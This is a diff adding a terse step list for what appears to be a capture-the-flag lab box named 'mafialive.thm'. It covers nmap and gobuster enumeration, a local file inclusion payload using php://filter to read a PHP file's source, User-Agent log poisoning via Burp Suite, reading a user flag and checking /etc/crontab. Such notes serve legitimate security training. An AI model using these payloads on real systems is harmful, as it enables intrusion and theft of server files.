@@ -1,0 +1,10 @@
+1 - nmap -A 10.10.135.4
+2 - echo "10.10.135.4 mafialive.thm" | tee -a /etc/host
+3 - gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - http://mafialive.thm/test.php (LFI)
+5 - http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+6 - echo "HASH" | base64 -d 
+7 - Burp Suite -> User Agent Poisoning
+8 - cat /home/archangel/user.txt
+9 - cat /etc/crontab
+10 - 
